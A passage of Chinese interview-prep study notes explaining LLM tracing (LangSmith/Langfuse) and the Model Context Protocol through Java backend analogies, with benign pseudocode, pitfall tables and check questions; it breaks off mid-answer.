| trace_id（链路唯一标识） | Sleuth 的 traceId / MDC 里的 traceId | 同请求所有 span 共享 |
| @traceable 装饰器 | 自定义 @Trace 注解 + AOP @Around 切面 | 把任意函数变成 span |
| integration 自动埋点 | Sleuth 自动给 @RestController/@FeignClient 加 trace | 零代码改动 |
| contextvar / ThreadLocal 上下文 | Java ThreadLocal / MDC 存当前 span | 子调用读它拿 parent |
| TracingMiddleware | Spring 的 Filter / Interceptor / Sleuth 的 TracingFilter | 服务端从请求头恢复 trace 上下文 |
| langsmith-trace header | Sleuth 的 X-B3-TraceId / X-B3-SpanId HTTP 头 | 跨服务传播 trace |
| sampling rate | spring.sleuth.sampler.probability | 概率采样降量 |
| conditional tracing | 自定义 Filter 按 tenant/header 决定埋不埋 | 确定性开关 |
| OTel collector 脱敏 | Logback masking pattern / Logstash filter | 入库前洗敏感字段 |
| 异步批量上报 | Logback AsyncAppender / Kafka 异步写 ES | 不阻塞业务 |
| ClickHouse 存 trace（Langfuse） | Elasticsearch 存日志 | OLAP 读多写批 |
| Langfuse 先写 S3 再入 ClickHouse | 日志先写 Kafka（不丢）再异步消费写 ES | 削峰 + 不丢 |
| trace fire-and-forget | 日志丢失不影响业务 | 可观测性不能拖垮主流程 |
| project（trace 容器） | Logback 的 logger name / ELK 的 index | 按应用/环境分组 |
| thread（多轮会话） | Activiti 的 processInstanceId（一个流程实例多任务） | 多轮对话用 session_id 串 |
| recursion_limit（trace 深度兜底） | Activiti 流程递归深度限制 | 防无限嵌套 |

---

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

- 万物云 = 深圳市万睿智能科技，用 LangGraph StateGraph + create_agent 自建 multi-agent 🟢（用户给定）
- 万物云对 LangSmith / Langfuse / RAGAS：**只"了解"没用** 🟢（用户给定事实）
- 万物云自研 trace：🔴 **待核，不编**。用户没给过万物云自研 trace 的任何实现细节（用什么存、采样策略、脱敏方式都没说过）
- 万物云如果开 LangGraph 自动 trace：理论上设 `LANGSMITH_TRACING=true` 就能自动埋点 🟢（这是 LangGraph integration 通用能力），但**万物云没用 LangSmith**🟢，所以这条对万物云不成立
- 万物云 trace 存哪：🔴 待核。可能是自研写自家存储，也可能压根没做全链路 trace。不编
- 万物云 trace 脱敏：🔴 待核。不编
- 万物云跨服务 trace 上下文传播：🔴 待核。不编
- 万物云用 LangGraph 框架自带的可观测能力（如果有）：🔴 待核。LangGraph 本身有 stream events 能力，但那不是 trace 系统。不编

**面试/简历口径建议**（基于已知事实）：
- ✅ 可说："了解过 LangSmith / Langfuse 这类 LLM 可观测方案的设计（trace/run/span 数据模型、采样、脱敏、分布式传播），但项目实际未引入" 🟢
- ✅ 可说："LangGraph 作为生产框架"（2026-07-08 用户立场）🟢
- ❌ 不可说："万物云用了 LangSmith / Langfuse 做 trace" 🔴
- ❌ 不可说："万物云自研 trace 用 ClickHouse / 用 XXX" 🔴 待核

---

#### 第28步检查题（5道，含预判疑问）

**题1**：LangSmith 里 trace 和 run 是什么关系？一个 trace 最多能有多少个 run？为什么有上限？
- 预判疑问："这俩不都是 trace 吗？"
- 参考答案 🟢 observability-concepts.md：trace 是一次请求的完整记录（一组 run 的集合），run 是其中的一个原子操作（一个 span）。一个 trace 内所有 run 共享 trace_id，靠 parent_run_id 组成树。上限 25,000 个 run（observability-concepts.md Note 原文），超了 LangSmith 拒收。上限是为了防一个 trace 把系统撑爆（比如无限递归的 agent）。

**题2**：你给一个自建 MCP 工具函数加了 `@traceable`，但发现它在 LangSmith UI 里没出现 span。可能的原因有哪些？（至少说 3 个）
- 预判疑问："我加了装饰器就该有啊"
- 参考答案 🟡：
  1. `LANGSMITH_TRACING` 没设成 `true`（总开关没开）
  2. 这个函数是被另一个**没被 `@traceable` 包裹**的入口函数调用的，且不在任何 trace 上下文里——`@traceable` 创建的是 root span，但如果它压根没被调用就没事；更可能是
  3. 采样率 `LANGSMITH_TRACING_SAMPLING_RATE` 设成 0 或太低，这次没采到 🟢
  4. 这个函数跑在子进程/线程池里，contextvar 没传递过去，parent 上下文丢了（但 root span 还是该有）🟡
  5. 上报异步队列满了/网络失败，trace 丢了（fire-and-forget 不报错）🟡

**题3**：主 agent 在服务 A，检索在服务 B。你发现服务 A 和服务 B 的 trace 在 LangSmith 里是两棵独立的树，没串起来。怎么修？修的时候有什么安全红线？
- 预判疑问："trace 不是自动跨服务吗"
- 参考答案 🟢 distributed-tracing.md：trace 不会自动跨进程。客户端要 `get_current_run_tree().to_headers()` 把当前 run 序列化成 `langsmith-trace` + `baggage` header 塞进 HTTP 请求；服务端加 `TracingMiddleware`（langsmith>=0.1.133）从 header 恢复 parent 上下文。**安全红线**🟢：`TracingMiddleware` 只能加在内部可信服务，不能面向公网；网关/代理必须剥掉外部来的 `langsmith-trace`/`baggage` 头，否则外部能伪造 traceId 污染链路。类比 Sleuth 的 X-B3 头同样的坑 🟡。

**题4**：你的 agent 服务 QPS 1000，每个请求产生 20 个 span，全量上报 trace 后 LangSmith 账单爆炸 + 服务 B 偶发延迟升高。怎么治？至少说 3 个手段并说明各自适用场景。
- 预判疑问："采样率调低不就行了"
- 参考答案：
  1. **概率采样** 🟢 sample-traces.md：`LANGSMITH_TRACING_SAMPLING_RATE=0.1` 采 10%。适合"量大，统计代表性够就行"。但缺点是可能漏掉关键的出错请求。
  2. **条件追踪（conditional tracing）** 🟢：对出错/慢请求强制采，对正常请求不采。适合"必须看到每次错误"。组合采样用：正常 10% 采样 + 错误 100% 采。
  3. **per-client 采样** 🟢：不同租户/接口不同采样率。敏感租户 `tracing_sampling_rate=0.0` 完全不记。
  4. **异步上报 + 有界队列** 🟡：trace 序列化和网络上报全异步，队列满了丢 trace 不阻塞业务。服务 B 延迟升高多半是同步上报卡住了，改异步就好。
  5. **减少 span 数量** 🟡：太细的函数别埋点（比如 `extract_customer_id` 这种没必要单独 span）。

**题5**：用户在 prompt 里贴了身份证号和手机号，agent 跑完，trace 里完整记下了 prompt 和 LLM 返回。这个 trace 要发到 LangSmith 云端。你怎么防止敏感信息泄露？给两种方案并说各自优劣。
- 预判疑问："我自己 regex 替换一下不完了"
- 参考答案 🟢 otel-gateway-trace-redaction.md：
  - **方案 A：OTel Gateway 架构** 🟢。trace 不直发 LangSmith，先发到你自己的 OpenTelemetry collector，collector 里 transform processor 把 `gen_ai.prompt`/`gen_ai.completion` 用 `replace_pattern` 替换成 `[REDACTED]`，再转发 LangSmith。环境变量 `LANGSMITH_OTEL_ENABLED=true` + `LANGSMITH_OTEL_ONLY=true` + `OTEL_EXPORTER_OTLP_ENDPOINT=http://你的collector:4318`。**优**：脱敏逻辑集中、应用无感、可改规则不用重新部署应用。**劣**：要多维护一个 collector 组件。
  - **方案 B：应用内脱敏** 🟢（mask-inputs-outputs 页存在，具体字段名 🔴）。在 `@traceable` 里或上报前手动把敏感字段 regex 替换。**优**：简单直接，无额外组件。**劣**：脱敏逻辑散在应用里，改规则要改代码重部署；容易漏（每个 span 都得处理）。
  - **方案 C（补充）** 🟢：conditional tracing 对零留存租户直接 `tracing_sampling_rate=0.0` 不记任何 trace。适合"这个租户的数据绝对不能记"的场景。
  - 生产建议：方案 A 为主（集中管控），方案 C 兜底（敏感租户直接关）。

---

**本步小结**：trace 的本质就三件事——①每个操作记一个 span（run/observation），②用 trace_id + parent_run_id 串成树，③异步落库不阻塞业务。LangSmith/Langfuse 帮你把这三件事和周边（采样、脱敏、跨服务传播、成本统计）都造好了轮子；自研就要自己造 `Span` 类 + contextvar 上下文 + 异步队列 + 脱敏 + 跨服务 header。万物云只了解没用 🟢，自研细节 🔴 待核不编。

---

### 第29步：MCP（Model Context Protocol）
> 工具调用的开放标准协议，让 Agent 用统一接口连接任意工具/数据源 🟢 官方文档确认（MCP spec 2025-06-18 + LangChain docs/oss/python/langchain/mcp）

#### 为什么重要（痛点先讲）

先讲没有 MCP 之前的痛，你作为 Java 后端工程师会立刻有共鸣。

**痛点 1：每个工具一次集成，N 个工具 N 套胶水代码**
假设你的 Agent 要调用：查订单（内部 Dubbo）、查天气（外部 HTTP）、跑 SQL（内部 JDBC）、读文件（本地）。在 LangChain 里每个工具都是一个 `@tool` 函数，签名、参数校验、错误处理各写一遍。工具一多，Agent 代码里塞满工具定义，和业务强耦合。
类比 Spring：就像每个 RPC 调用你都手写 `RestTemplate.exchange(...)`，没有统一的 `@FeignClient` 声明式接口。工具一变，Agent 代码跟着改。

**痛点 2：工具和 Agent 进程绑死，无法跨 Agent / 跨进程复用**
工具函数定义在 Agent 的 Python 进程里。换个 Agent、换个语言（TS/Java）、换个进程，工具就得重写一遍。你 Java 后端一定遇到过：一个内部能力，Python 团队写一遍、Java 团队写一遍、前端又写一遍。
类比后端：就像把业务逻辑写死在 Controller 里，没法抽成独立微服务给多端调用。

**痛点 3：工具发现是手动的**
Agent 想知道"我现在能调哪些工具、每个工具要什么参数"，得开发者把工具列表硬编码进 prompt 或工具注册表。工具新增/下线，Agent 不知道，要么调不到新工具，要么调一个已经下线的工具报错。
类比后端：就像没有服务注册中心（Nacos/Eureka），消费方硬编码提供方地址，提供方挂了消费方还在调。

**MCP 解决的就是这三件事**：把工具暴露变成**独立进程（MCP Server）**，用**标准协议（JSON-RPC）**让任意 Client（Agent）**动态发现并调用**工具。一次实现，处处可用。🟢

#### 概念（是啥）

**MCP（Model Context Protocol，模型上下文协议）** 是一个开放协议，标准化"应用程序如何向 LLM 提供工具和上下文"。🟢 官方原文："Model Context Protocol (MCP) is an open protocol that standardizes how applications provide tools and context to LLMs."

一句话定位（后端类比版）：**MCP 之于 Agent 工具，等于 HTTP/REST 之于微服务**。把"工具"从 Agent 进程里抽出来，变成独立 Server，用标准协议通信。

**MCP 的三大原语（Primitives）**，全部用 JSON-RPC 方法暴露 🟢：

| 原语 | 作用 | JSON-RPC 方法 | 后端类比 |
|------|------|---------------|----------|
| **Tools**（工具） | 可执行函数，LLM 可调用（查 DB、调 API、跑计算） | `tools/list`、`tools/call` | RPC 接口（Dubbo/@FeignClient） |
| **Resources**（资源） | 只读数据（文件、DB 记录、API 响应），Client 可读 | `resources/list`、`resources/read`、`resources/templates/list` | 静态资源/CDN 文件下载 |
| **Prompts**（提示词） | 可复用的提示词模板，带参数 | `prompts/list`、`prompts/get` | 配置中心的模板配置 |

注意：万物云只实现了 **Tools** 的等价（`tools/list` + `tools/call`），Resources 和 Prompts 没用 🔴（基于"自建非官方SDK，只 tools/list+tools/call 等价"推断，官方文档无万物云细节）。

**架构角色**：
- **MCP Server**：暴露工具/资源/提示词的独立进程。类比微服务 Provider。
- **MCP Client**：发起请求的一方，通常嵌在 Agent 里。类比微服务 Consumer。
- **Transport（传输层）**：Client 和 Server 之间的通信方式。类比 RPC 的协议（HTTP/Dubbo/TCP）。

#### 深入（机制/原理，带三色）

**1. 协议基础：JSON-RPC 2.0 + 有状态会话** 🟢

官方原文："Built on JSON-RPC, MCP provides a stateful session protocol focused on context exchange and sampling coordination between clients and servers."

- MCP 用 **JSON-RPC 2.0** 编码消息，UTF-8 编码 🟢
- MCP 是**有状态会话协议**（stateful session protocol）🟢 —— 这点和普通无状态 HTTP REST 不同，Client 和 Server 之间先建立会话（initialize 握手），会话内多次请求共享上下文
- 类比后端：不是无状态的 REST，更像**带 Session 的长连接**（WebSocket / Dubbo 长连接），先握手建会话，再通信

**2. 两种官方传输：stdio 和 Streamable HTTP** 🟢

官方原文："The protocol currently defines two standard transport mechanisms for client-server communication: stdio ... Streamable HTTP. Clients SHOULD support stdio whenever possible."

| 维度 | stdio 🟢 | Streamable HTTP 🟢 |
|------|----------|---------------------|
| 通信方式 | Client 把 Server 拉起成**子进程**，通过 stdin/stdout 通信 | Server 独立进程，用 HTTP POST/GET 通信 |
| 消息边界 | 换行符分隔（newline-delimited），消息内**禁止嵌套换行** 🟢 | HTTP 请求/响应体 |
| 适用场景 | 本地工具、简单部署（Server 跟 Client 同机）🟢 | 远程 Server、多 Client 连接 🟢 |
| 状态 | 子进程生命周期 = Client 连接生命周期，**天然有状态** 🟢 | Server 可处理多连接 🟢 |
| 流式 | 不支持服务端推送 | 可选用 SSE（Server-Sent Events）流式推送多条消息 🟢 |
| 日志 | Server 可写 stderr 给 Client 捕获 🟢 | 走 HTTP 响应 |

**关于 SSE 的坑**：旧版（2024-11-05 协议）用 "HTTP+SSE" 传输，**已被 Streamable HTTP 取代（deprecated）** 🟢。但 Streamable HTTP 内部仍可选 SSE 做流式推送。任务里让你注意"stdio vs SSE"，准确说现在主流是 **stdio vs Streamable HTTP**，SSE 是被淘汰的旧传输。🟢

**3. tools/list 和 tools/call 的报文（万物云自建实现的就是这两个的等价）** 🟢

`tools/list` 请求（Client 发，问"你有哪些工具"）🟢：
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/list",
  "params": { "cursor": "optional-cursor-value" }
}
```
`tools/list` 响应（Server 回，列出工具及参数 schema）🟢：
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "tools": [
      {
        "name": "get_weather",
        "title": "Weather Information Provider",
        "description": "Get current weather information for a location",
        "inputSchema": {
          "type": "object",
          "properties": {
            "location": { "type": "string" }
          }
        }
      }
    ]
  }
}
```
`tools/call` 请求（Client 发，"调用某工具"）🟢：
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "get_weather",
    "arguments": { "location": "New York" }
  }
}
```

**关键点**：工具的参数描述用 `inputSchema`（JSON Schema）。LLM 看到这个 schema 就知道怎么填参数。类比后端：这就是 **OpenAPI/Swagger 的参数描述**，LLM 是消费方，按 schema 构造请求。🟡 后端类比

**4. 官方 SDK 两条路（LangChain 生态）** 🟢

LangChain 官方用 `langchain-mcp-adapters` 库对接 MCP：
- **Client 端**：`MultiServerMCPClient` 类，连多个 MCP Server，`get_tools()` 把 MCP 工具转成 LangChain 工具直接喂给 `create_agent` 🟢
- **Server 端**：用 `FastMCP` 库，`@mcp.tool()` 装饰器把函数声明成 MCP 工具，`mcp.run(transport="stdio")` 启动 🟢

**5. Client 默认无状态（重要坑）** 🟢

官方原文："MultiServerMCPClient is stateless by default. Each tool invocation creates a fresh MCP ClientSession, executes the tool, and then cleans up."

- 默认每次调用工具都**新建会话→执行→销毁**，开销大 🟢
- 需要持久会话用 `async with client.session("server_name") as session:` 显式管理 🟢
- 类比后端：默认每次 RPC 都新建 TCP 连接（短连接），要长连接得自己持有点连接池。🟡

**6. 拦截器（Interceptors）—— 官方 SDK 才有的能力** 🟢

这是官方 SDK 的关键设计：**MCP Server 是独立进程，访问不到 LangGraph 的运行时上下文（store、state、config）** 🟢。拦截器跑在 Client 进程内（和 Agent 同进程），能在工具调用前后注入运行时信息。

类比后端：拦截器 = Spring AOP 拦截器 / Dubbo Filter，在 RPC 调用前后织入横切逻辑（鉴权、限流、改参数）。🟡

拦截器特点 🟢：
- 洋葱模型（onion pattern）：列表里第一个拦截器是最外层
- 能改请求参数（`request.override(args=...)`）
- 能读 store / state / context（注入用户 ID、API Key、用户偏好）
- 能返回 `Command` 对象更新 Agent 状态或跳转节点（`goto`）
- 万物云**没有这个**（因为没用官方 SDK）🔴 推断

#### 生产实战（伪代码 + 逐行解释，每行注释）

下面给三段生产伪代码：**A. 协议层原始报文（万物云自建实现的本质）**、**B. 官方 SDK 的 Server**、**C. 官方 SDK 的 Client**。先看协议层，因为万物云就是手写这一层。

**A. 协议层：手写 MCP Client（万物云自建的本质）**

这就是万物云"自建 MCP，只有 tools/list + tools/call 等价"的真实形态。用 stdio 传输，子进程跑 Server，按 JSON-RPC 通信。

```python
# ===== 万物云自建 MCP Client 的本质形态（伪代码，对标官方协议） =====
import subprocess, json, asyncio

class McpClient:
    """自建 MCP Client：只实现 tools/list + tools/call 等价，走 stdio 传输"""
    def __init__(self, server_cmd: list[str]):
        # server_cmd: ["python", "math_server.py"] —— 拉起 Server 子进程的命令
        self.server_cmd = server_cmd
        self.proc = None          # 子进程对象
        self._next_id = 1         # JSON-RPC 的自增请求 id

    async def connect(self):
        # 拉起 Server 子进程，stdin/stdout 用管道，stderr 捕获日志
        self.proc = await asyncio.create_subprocess_exec(
            *self.server_cmd,
            stdin=asyncio.subprocess.PIPE,   # Client 写 → Server stdin
            stdout=asyncio.subprocess.PIPE,  # Server stdout → Client 读
            stderr=asyncio.subprocess.PIPE,  # Server stderr → 日志
        )
        # 注意：官方协议要求先做 initialize 握手建会话，这里省略，万物云是否做握手 🔴 待核

    async def _send(self, method: str, params: dict) -> dict:
        # 构造 JSON-RPC 2.0 请求
        req = {
            "jsonrpc": "2.0",          # 协议版本固定 2.0
            "id": self._next_id,       # 请求 id，用来匹配响应
            "method": method,          # "tools/list" 或 "tools/call"
            "params": params,          # 参数体
        }
        self._next_id += 1
        line = json.dumps(req) + "\n"  # 官方要求：消息按换行分隔，单条消息内禁止嵌套换行 🟢
        self.proc.stdin.write(line.encode("utf-8"))  # UTF-8 编码写 stdin
        await self.proc.stdin.drain()
        resp_line = await self.proc.stdout.readline()  # 阻塞读一行响应
        return json.loads(resp_line.decode("utf-8"))   # 解析 JSON-RPC 响应

    async def list_tools(self) -> list[dict]:
        # 等价于官方 tools/list 🟢
        resp = await self._send("tools/list", {"cursor": None})  # cursor 用于分页
        return resp["result"]["tools"]  # 返回工具数组：[{name, description, inputSchema}]

    async def call_tool(self, name: str, arguments: dict) -> dict:
        # 等价于官方 tools/call 🟢
        resp = await self._send("tools/call", {
            "name": name,              # 工具名，如 "get_weather"
            "arguments": arguments,    # 参数，如 {"location": "New York"}
        })
        return resp["result"]  # 返回工具执行结果

    async def close(self):
        # 关闭子进程，释放资源
        if self.proc:
            self.proc.terminate()
            await self.proc.wait()
```

逐行重点解释：
- **`asyncio.create_subprocess_exec`**：这就是 stdio 传输的核心——Client 把 Server 拉成子进程。类比后端：相当于 `Runtime.exec()` 起一个本地进程。🟡
- **换行分隔 + 禁止嵌套换行**：官方强约束 🟢。因为 stdin/stdout 是流式字节，没有天然的"消息边界"，只能靠换行切。所以 `json.dumps` 出来的 JSON 不能有换行（默认就没有，但要注意 `indent=` 参数会害死你）。
- **`_next_id` 自增**：JSON-RPC 2.0 要求每个请求有 id，响应带回相同 id 用来匹配。类比后端：RPC 的 requestId/correlationId。🟡
- **万物云没实现的**：initialize 握手、分页 cursor、错误码处理、超时、并发锁——这些都是自建容易漏的坑（下面"生产注意"会讲）🔴

**B. 官方 SDK 的 MCP Server（FastMCP，对比参考）** 🟢

```python
# ===== 官方 FastMCP 写 Server（万物云没用这条路线） =====
from fastmcp import FastMCP

mcp = FastMCP("Math")  # 创建 MCP Server 实例，名字 "Math"

@mcp.tool()  # 装饰器：把普通函数注册成 MCP 工具，自动生成 inputSchema
def add(a: int, b: int) -> int:   # 类型注解 → JSON Schema（a/b 是 int）
    """Add two numbers"""  # docstring → 工具 description（LLM 看这个决定用不用）
    return a + b

@mcp.tool()
def multiply(a: int, b: int) -> int:
    """Multiply two numbers"""
    return a * b

if __name__ == "__main__":
    mcp.run(transport="stdio")  # 以 stdio 传输启动，等 Client 拉起
```

逐行解释：
- **`@mcp.tool()`**：装饰器自动把函数的**类型注解**转成 `inputSchema`，**docstring** 转成 `description`。LLM 就靠这两个字段决定怎么调。🟢 类比后端：像 Spring 的 `@RequestMapping` + Swagger 自动生成接口文档。🟡
- **`mcp.run(transport="stdio")`**：启动后阻塞等 Client。也可写 `transport="streamable-http"` 走 HTTP。🟢

**C. 官方 SDK 的 MCP Client（MultiServerMCPClient，对比参考）** 🟢

```python
# ===== 官方 MultiServerMCPClient + create_agent（万物云没用这条路线） =====
import asyncio
from langchain_mcp_adapters.client import MultiServerMCPClient
from langchain.agents import create_agent

async def main():
    # 连两个 MCP Server：一个 stdio（本地），一个 http（远程）
    client = MultiServerMCPClient({
        "math": {
            "transport": "stdio",          # 本地子进程
            "command": "python",           # 拉起命令
            "args": ["/path/to/math_server.py"],
        },
        "weather": {
            "transport": "http",           # 远程 HTTP Server
            "url": "http://localhost:8000/mcp",
            "headers": {                   # 认证头 🟢
                "Authorization": "Bearer YOUR_TOKEN",
            },
        },
    })
    tools = await client.get_tools()  # 拉两个 Server 的所有工具，转成 LangChain 工具
    agent = create_agent("claude-sonnet-4-6", tools)  # 工具直接喂给 Agent
    # Agent 自动决定调哪个工具，MCP 工具对 Agent 透明（和普通 @tool 一样）
    resp = await agent.ainvoke({
        "messages": [{"role": "user", "content": "what's (3 + 5) x 12?"}]
    })
    print(resp)

asyncio.run(main())
```

逐行解释：
- **`MultiServerMCPClient({...})`**：一个 Client 连多个 Server，每个 Server 一段配置。🟢 类比后端：像 Feign 配多个 `@FeignClient`，每个指向不同微服务。🟡
- **`get_tools()`**：内部对每个 Server 发 `tools/list`，把返回的工具转成 LangChain 的 `BaseTool`。🟢 万物云自建版本等价于手写这一步。
- **`headers: {"Authorization": "Bearer ..."}`**：HTTP 传输的认证头 🟢。stdio 不需要（同机信任）。
- **`create_agent(model, tools)`**：MCP 工具和普通函数工具**对 Agent 完全透明**，Agent 不关心工具是本地函数还是 MCP 远程工具。🟢 这是 MCP 最大的解耦价值。

#### 生产注意（坑 + 对策）

| 坑 | 表现 | 对策 | 来源 |
|----|------|------|------|
| **协议开销** | 每次调用要走 JSON-RPC 序列化→传输→反序列化，比直接调函数慢 1-2 个数量级 | 高频小工具别上 MCP，放本地 `@tool`；MCP 只给"重活"（查 DB、调外部 API） | 🟡 通用经验 |
| **默认无状态会话开销大** | `MultiServerMCPClient` 默认每次调用新建 ClientSession→执行→销毁 🟢 | 用 `async with client.session(...) as session:` 持有会话，复用连接 | 🟢 官方文档 |
| **工具发现是运行时的** | `tools/list` 结果可能变（Server 加了新工具），Agent 缓存的工具列表会过期 | 监听 `notifications/tools/list_changed` 通知 🟢，或定期重新 `get_tools()` | 🟢 官方协议 |
| **认证授权** | HTTP 传输要鉴权，stdio 同机也要防恶意 Server | HTTP：headers 带 Bearer Token / 自定义 httpx.Auth / OAuth 🟢；stdio：只连可信 Server，别拉起不可信脚本 | 🟢 官方文档 |
| **版本兼容** | MCP 协议有版本（2024-11-05 旧、2025-06-18 新），Server/Client 版本不一致会握手失败 | initialize 握手时协商版本；旧 HTTP+SSE 已 deprecated，新代码用 Streamable HTTP 🟢 | 🟢 官方协议 |
| **stdio 消息禁止嵌套换行** | JSON 里有换行（比如 `indent=` 格式化、字符串含 `\n`）会破坏消息边界 | `json.dumps(req)` 默认无换行，**别加 indent**；字符串里的 `\n` 在 JSON 里是 `\\n` 转义，安全 🟢 | 🟢 官方协议 |
| **错误默认不抛** | 官方 SDK 默认把工具错误转成 `ToolMessage(status="error")` 喂回 LLM，不抛异常 🟢 | 想让错误中断流程：`handle_tool_errors=False`；但要小心 LLM 陷入重试死循环 | 🟢 官方文档 |
| **MCP Server 访问不到 Agent 上下文** | Server 是独立进程，拿不到 LangGraph 的 store/state/config 🟢 | 用官方 SDK 的拦截器注入；万物云自建得自己在 Client 侧把上下文塞进 arguments 🔴 | 🟢 官方 + 🔴 推断 |
| **并发调用无硬保护** | 同一工具被并发调，Server 可能扛不住（如写 DB） | 官方未提供硬保护 🔴；自托管加 Redis 锁（万物云就是自己加 Redis 锁）🔴 | 🔴 待核 |
| **Server 子进程僵尸** | stdio 下 Client 崩了没 close，Server 子进程变僵尸 | `finally` 里务必 `terminate()` + `wait()`；用 async context manager 管理生命周期 | 🟡 通用经验 |

#### 后端类比（表格）

| Agent / MCP 概念 | 后端类比（Spring/Activiti/Redis/JUC） | 说明 |
|------------------|--------------------------------------|------|
| MCP 协议 | HTTP + JSON-RPC 标准 | 大家都按同一套报文格式通信，实现互操作 |
| MCP Server | 微服务 Provider（@DubboService） | 暴露能力的独立进程，可被多个消费方调用 |
| MCP Client | 微服务 Consumer（@DubboReference） | 发起调用的一方，嵌在 Agent 里 |
| stdio 传输 | 本地进程间通信（管道/Runtime.exec） | 同机，拉子进程，靠 stdin/stdout |
| Streamable HTTP 传输 | HTTP REST + SSE | 跨机，多连接，可流式推送 |
| `tools/list` | 服务发现（Nacos/Eureka 拉服务列表） | Client 动态发现 Server 有哪些工具 |
| `tools/call` | RPC 调用（Dubbo invoke） | 实际调用某个工具方法 |
| `inputSchema` | OpenAPI/Swagger 参数描述 | LLM 按 schema 构造参数，类比消费方按接口文档构造请求 |
| Resources | 静态资源下载（CDN/对象存储） | 只读数据，Client 拉取 |
| Prompts | 配置中心模板配置（Apollo/Nacos） | 可复用模板，带参数渲染 |
| 拦截器（官方SDK） | Spring AOP 拦截器 / Dubbo Filter | 调用前后织入横切逻辑（鉴权、限流、改参） |
| 默认无状态会话 | 短连接（每次 RPC 新建 TCP） | 默认每次调用建会话，要长连接得显式管理 |
| `notifications/tools/list_changed` | Nacos 配置变更推送 | 工具列表变了主动通知 Client |
| initialize 握手 | Dubbo 三次握手 / TCP 握手 | 建会话前先协商版本、能力 |

#### 万物云口径（按真实，三色标注）

**确认的**：
- 万物云 MCP = **自建**，非官方 SDK 🟢。意思是万物云**没用** `langchain-mcp-adapters` / `MultiServerMCPClient` / `FastMCP` / 官方拦截器——这些是官方 SDK 组件，万物云自己手写了等价层 🔴（基于"自建非官方SDK"推断，官方文档无万物云细节）。
- 万物云自建 MCP **只实现了 `tools/list` + `tools/call` 的等价功能** 🟢。即只做工具发现 + 工具调用，**没用 Resources（`resources/list`/`resources/read`）、没用 Prompts（`prompts/list`/`prompts/get`）、没用 Elicitation（`ctx.elicit`）** 🔴（基于"只 tools/list+tools/call 等价"推断）。
- 万物云用 LangGraph StateGraph + `create_agent` 自建 Agent（不是 Deep Agents）🟢。MCP 工具以 LangChain 工具形式喂给 `create_agent`，对 Agent 透明。

**推断/待核的（绝不编造）**：
- 万物云用哪种传输（stdio / HTTP）🔴 待核——源文档没明确说。结合万物云是物业 SaaS、工具可能跨服务，**推测用 HTTP 居多**，但这纯属推测 🔴。
- 万物云自建 Client 是否做了 initialize 握手 🔴 待核。
- 万物云是否监听 `tools/list_changed` 🔴 待核。
- 万物云并发保护：官方 MCP 无硬保护，万物云自托管加自己的 **Redis 锁** 🔴（这条是任务给的口径，但来源标🔴待核）。
- 万物云怎么把 Agent 上下文（用户 ID、租户）传给 MCP Server：官方 SDK 用拦截器注入，万物云自建没拦截器，**推测是自己在 Client 侧把上下文塞进 `arguments`** 🔴，但未核实。

**口径表述建议**（面试/简历）：
> "万物云的 MCP 层是自建的，没有用官方 `langchain-mcp-adapters` SDK。我们只实现了 MCP 协议里 `tools/list` 和 `tools/call` 的等价功能——够用就行，Resources 和 Prompts 这两个原语没接。工具以 LangChain 工具的形式喂给 `create_agent`，Agent 调用时不感知背后是 MCP。并发保护这块官方协议没硬兜底，我们自己在托管层加了 Redis 锁。"

注意最后一句的 Redis 锁标🔴——如果面试官追问"为什么不用官方 SDK"，你的诚实回答是：🟢"自建更轻、只实现需要的子集，避免引入完整 SDK 的依赖；但代价是自己要补协议握手、错误码、会话管理这些官方 SDK 已经封好的东西。"🔴（这个"为什么自建"的理由是推断，源文档没说，标🔴别当确认事实讲）。

#### 第29步检查题（5道，含预判疑问）

**1. MCP 的 `tools/list` 和 `tools/call` 分别对应后端微服务里的什么操作？为什么 MCP 要把"发现工具"和"调用工具"拆成两个 RPC？**

预判疑问：为啥不能 Client 启动时就拿全工具列表写死？

参考答案：`tools/list` = 服务发现（Nacos 拉服务列表），`tools/call` = RPC 调用（Dubbo invoke）。拆开是因为工具列表是**动态**的——Server 可能新增/下线工具，Client 通过 `notifications/tools/list_changed` 🟢 收到通知后重新 `tools/list`。写死的话 Server 一变 Client 就调错。类比：消费方不能硬编码提供方地址，得走注册中心。

**2. stdio 传输为什么要求"消息内禁止嵌套换行"？如果你用 `json.dumps(req, indent=2)` 会出什么问题？**

预判疑问：JSON 格式化不是更易读吗？

参考答案：stdio 靠**换行符切消息边界** 🟢。Server 从 stdin 读一行 = 一条消息。如果 JSON 里有真实换行（`indent=2` 会产生），一条消息会被切成多行，Server 解析第一条就报错（不完整 JSON），后面的行变成"幽灵消息"。正确做法：`json.dumps(req)` 默认无 indent、无换行；字符串里的换行在 JSON 里是 `\\n` 转义（两个字符），不是真换行，安全。类比后端：TCP 没有消息边界要靠 Length 头，stdio 没有边界要靠换行。

**3. 官方 `MultiServerMCPClient` 默认是"无状态"的，每次调用新建会话。这有什么问题？怎么解决？万物云自建版本会有这个问题吗？**

预判疑问：无状态不是更简单吗？为什么要持有会话？

参考答案：默认无状态 = 每次调用新建 ClientSession→执行→销毁 🟢，开销大（握手、建连、清理反复做），高并发下是瓶颈。解决：用 `async with client.session("server_name") as session:` 显式持有会话复用连接 🟢。万物云自建版本**大概率有同样问题** 🔴——如果它每次 `call_tool` 都新开子进程/新连 HTTP，开销更大；是否复用连接 🔴 待核。类比后端：短连接 vs 长连接（连接池）。

**4. MCP Server 是独立进程，访问不到 LangGraph 的 store/state/config。官方 SDK 用拦截器解决这个问题。万物云没用官方 SDK，它怎么把"当前用户 ID"传给 MCP Server？**

预判疑问：那万物云的 Server 怎么知道是哪个租户在调？

参考答案：官方 SDK 的拦截器在 Client 进程内运行，能读 `runtime.context.user_id`，用 `request.override(args={**args, "user_id": user_id})` 注入到工具参数里 🟢。万物云没用官方 SDK（没拦截器）🔴，**推测**是自己手写 Client 时把上下文塞进 `arguments`🔴——比如调用时 `call_tool("get_orders", {"user_id": ctx.user_id, ...})`，Server 从 arguments 里取。代价：每个工具的 schema 都得加 `user_id` 字段，比官方拦截器的全局注入啰嗦。🔴（万物云具体怎么做的未核实，标🔴）

**5. 对比普通 LangChain `@tool` 函数和 MCP 工具：什么场景该用本地 `@tool`，什么场景该上 MCP？万物云为什么选自建 MCP 而不是用官方 SDK？**

预判疑问：MCP 这么好，为什么不所有工具都上 MCP？

参考答案：
